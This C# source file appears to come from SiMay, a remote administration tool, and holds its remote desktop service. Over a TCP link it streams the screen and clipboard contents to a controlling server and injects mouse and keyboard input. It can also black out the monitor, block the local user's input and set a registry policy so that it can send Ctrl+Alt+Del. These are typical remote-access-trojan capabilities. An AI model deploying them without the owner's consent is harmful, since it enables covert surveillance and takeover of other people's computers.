using SiMay.Core;
using SiMay.Core.Enums;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Core.Packets.Screen;
using SiMay.Core.ScreenSpy;
using SiMay.Core.ScreenSpy.Entitys;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.Serialize;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static SiMay.ServiceCore.CommonWin32Api;
using SiMay.ServiceCore.Win32;
//using static SiMay.ServiceCore.Win32.User32;
using SiMay.Basic;
using SiMay.ServiceCore.ApplicationService.Registry;
using System.Linq;

namespace SiMay.ServiceCore.ApplicationService
{
    [ServiceName("远程桌面")]
    [ServiceKey("RemoteDesktopJob")]
    public class ScreenService : ServiceManager, IApplicationService
    {
        private int _bscanmode = 1; //0差异 1逐行
        private bool _cleanWallPaper = false;
        private static string wallpaper = string.Empty;
        private bool _hasSystemAuthor = AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase);
        private ScreenSpy _spy;
        private PacketModelBinder<TcpSocketSaeaSession, MessageHead> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession, MessageHead>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    if (_cleanWallPaper)
                        User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, wallpaper, User32.SPIF_UPDATEINIFILE | User32.SPIF_SENDWININICHANGE);
                    this._handlerBinder.Dispose();
                    break;
            }
        }

        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            _session.Socket.NoDelay = false;
            SendAsyncToServer(MessageHead.C_MAIN_ACTIVE_APP,
                new ActiveAppPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey(),
                    OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                });

            _spy = new ScreenSpy(new BitBltCapture(true));
            _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;
        }

        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
        {
            this.CloseSession();
        }

        [PacketHandler(MessageHead.S_SCREEN_DELETE_WALLPAPER)]
        public void DeleteWallPaper(TcpSocketSaeaSession session)
        {
            _cleanWallPaper = true;
            wallpaper = new string('\0', 260);
            User32.SystemParametersInfo(0x73, 260, wallpaper, 0);
            wallpaper = wallpaper.Substring(0, wallpaper.IndexOf('\0'));
            User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, "", 0);
        }

        [PacketHandler(MessageHead.S_SCREEN_SET_CLIPBOARD_TEXT)]
        public void SetClipoardHandler(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<ScreenSetClipoardPack>();

            Thread thread = new Thread(() =>
            {
                Clipboard.SetText(pack.Text);
            });
            thread.SetApartmentState(ApartmentState.STA);//线程STA模式
            thread.Start();
        }

        [PacketHandler(MessageHead.S_SCREEN_GET_CLIPOARD_TEXT)]
        public void GetClipoardHandler(TcpSocketSaeaSession session)
        {
            Thread thread = new Thread(() =>
            {
                var text = Clipboard.GetText();
                SendAsyncToServer(MessageHead.C_SCREEN_CLIPOARD_TEXT,
                    new ScreenClipoardValuePack()
                    {
                        Value = text
                    });
            });
            thread.SetApartmentState(ApartmentState.STA);//线程STA模式
            thread.Start();

        }

        [PacketHandler(MessageHead.S_SCREEN_GET_INIT_BITINFO)]
        public void SendDesktopBitInfo(TcpSocketSaeaSession session)
            => SendDesktopInitInfo();

        private void SendDesktopInitInfo()
        {
            SendAsyncToServer(MessageHead.C_SCREEN_BITINFO,
               new ScreenInitBitPack()
               {
                   Height = _spy.ScreenHeight,
                   Width = _spy.ScreenWidth,
                   PrimaryScreenIndex = _spy.Capturer.SelectedScreen,
                   Monitors = Screen.AllScreens.Select(c => new MonitorItem()
                   {
                       DeviceName = c.DeviceName,
                       Primary = c.Primary
                   }).ToArray()
               });
        }

        [PacketHandler(MessageHead.S_SCREEN_CHANGE_MONITOR)]
        public void MonitorChangeHandler(TcpSocketSaeaSession session)
        {
            var currenMonitor = session.CompletedBuffer.GetMessageEntity<MonitorChangePack>().MonitorIndex;
            _spy.Capturer.SelectedScreen = currenMonitor;

            SendDesktopInitInfo();
        }

        private void ScreenDifferences_OnDifferencesNotice(Fragment[] fragments, DifferStatus nCode)
        {
            switch (nCode)
            {
                case DifferStatus.FULLDIFFERENCES:
                    SendAsyncToServer(MessageHead.C_SCREEN_DIFFBITMAP,
                        new ScreenFragmentPack()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.NEXTSCREEN:
                    SendAsyncToServer(MessageHead.C_SCREEN_BITMP,
                        new ScreenFragmentPack()
                        {
                            Fragments = fragments
                        });
                    break;

                case DifferStatus.COMPLETE:
                    SendAsyncToServer(MessageHead.C_SCREEN_SCANCOMPLETE);
                    break;
            }
        }
        [PacketHandler(MessageHead.S_SCREEN_NEXT_SCREENBITMP)]
        public void SendNextScreen(TcpSocketSaeaSession session)
        {
            var rect = session.CompletedBuffer.GetMessageEntity<ScreenHotRectanglePack>();
            //根据监控模式使用热区域扫描
            bool ishotRegtionScan = rect.CtrlMode == 1 ? true : false;

            if (_hasSystemAuthor)
                Win32Interop.SwitchToInputDesktop();

            if (_bscanmode == 0)
                _spy.FindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
            else if (_bscanmode == 1)
                _spy.FullFindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
        }

        [PacketHandler(MessageHead.S_SCREEN_CTRL_ALT_DEL)]
        public void CtrlAltDelHandler(TcpSocketSaeaSession session)
        {
            var registryKey = RegistryEditor.GetWritableRegistryKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            registryKey.SetValue("SoftwareSASGeneration", 00000003, Microsoft.Win32.RegistryValueKind.DWord);

            if (AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase))
                UserTrunkContext.UserTrunkContextInstance?.SendSas();
            else
                User32.SendSAS(true);
        }

        [PacketHandler(MessageHead.S_SCREEN_CHANGESCANMODE)]
        public void ChangeSpyScanMode(TcpSocketSaeaSession session)
        {
            _bscanmode = session.CompletedBuffer.GetMessagePayload()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_SETQTY)]
        public void SetImageQuality(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<ScreenSetQtyPack>();
            _spy.SetImageQuality = pack.Quality;
        }

        [PacketHandler(MessageHead.S_SCREEN_RESET)]
        public void SetSpyFormat(TcpSocketSaeaSession session)
        {
            _spy.SetFormat = session.CompletedBuffer.GetMessagePayload()[0];
        }

        [PacketHandler(MessageHead.S_SCREEN_BLACKSCREEN)]
        public void SetScreenBlack(TcpSocketSaeaSession session)
        {
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEBLOCK)]
        public void SetMouseBlock(TcpSocketSaeaSession session)
        {
            if (session.CompletedBuffer.GetMessagePayload()[0] == 10)
                BlockInput(true);
            else
                BlockInput(false);
        }

        [PacketHandler(MessageHead.S_SCREEN_MOUSEKEYEVENT)]
        public void MouseKeyEvent(TcpSocketSaeaSession session)
        {
            var @event = session.CompletedBuffer.GetMessageEntity<ScreenMKeyPack>();
            Screen[] allScreens = Screen.AllScreens;
            int offsetX = allScreens[_spy.Capturer.SelectedScreen].Bounds.X;
            int offsetY = allScreens[_spy.Capturer.SelectedScreen].Bounds.Y;

            int p1 = @event.Point1 + offsetX;
            int p2 = @event.Point2 + offsetY;
            switch (@event.Key)
            {
                case MOUSEKEY_ENUM.Move:
                    //SendMouseMove(p1, p2);
                    SetCursorPos(p1, p2);
                    break;

                case MOUSEKEY_ENUM.LeftDown:
                    //SendLeftMouseDown(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.LeftUp:
                    //SendLeftMouseUp(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.MiddleDown:
                    User32.SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.MiddleUp:
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.RightDown:
                    //SendRightMouseDown(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.RightUp:
                    //SendRightMouseUp(p1, p2);
                    SetCursorPos(p1, p2);
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    break;

                case MOUSEKEY_ENUM.Wheel:
                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, p1, 0);
                    //SendMouseWheel(p1);
                    break;

                case MOUSEKEY_ENUM.KeyDown:
                    keybd_event((byte)p1, 0, 0, 0);
                    //SendKeyDown(p1.ConvertTo<VirtualKey>());
                    break;

                case MOUSEKEY_ENUM.KeyUp:
                    //SendKeyUp(p1.ConvertTo<VirtualKey>());
                    keybd_event((byte)p1, 0, WM_KEYUP, 0);
                    break;
            }
        }
        //public void SendKeyDown(VirtualKey keyCode)
        //{
        //    var union = new InputUnion()
        //    {
        //        ki = new KEYBDINPUT()
        //        {
        //            wVk = keyCode,
        //            wScan = 0,
        //            time = 0,
        //            dwExtraInfo = GetMessageExtraInfo()
        //        }
        //    };
        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public void SendKeyUp(VirtualKey keyCode)
        //{
        //    var union = new InputUnion()
        //    {
        //        ki = new KEYBDINPUT()
        //        {
        //            wVk = keyCode,
        //            wScan = 0,
        //            time = 0,
        //            dwFlags = KEYEVENTF.KEYUP,
        //            dwExtraInfo = GetMessageExtraInfo()
        //        }
        //    };
        //    var input = new INPUT() { type = InputType.KEYBOARD, U = union };
        //    SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendLeftMouseDown(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public uint SendLeftMouseUp(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.LEFTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendRightMouseDown(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTDOWN | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}
        //public uint SendRightMouseUp(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.RIGHTUP | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendMouseMove(double percentX, double percentY)
        //{
        //    var union = new InputUnion() { mi = new MOUSEINPUT() { dwFlags = MOUSEEVENTF.ABSOLUTE | MOUSEEVENTF.MOVE | MOUSEEVENTF.VIRTUALDESK, dx = (int)percentX, dy = (int)percentY, time = 0, mouseData = 0, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new INPUT[] { input }, INPUT.Size);
        //}

        //public uint SendMouseWheel(int deltaY)
        //{
        //    if (deltaY < 0)
        //    {
        //        deltaY = -120;
        //    }
        //    else if (deltaY > 0)
        //    {
        //        deltaY = 120;
        //    }
        //    var union = new InputUnion() { mi = new User32.MOUSEINPUT() { dwFlags = MOUSEEVENTF.WHEEL, dx = 0, dy = 0, time = 0, mouseData = deltaY, dwExtraInfo = GetMessageExtraInfo() } };
        //    var input = new INPUT() { type = InputType.MOUSE, U = union };
        //    return SendInput(1, new User32.INPUT[] { input }, INPUT.Size);
        //}
    }
}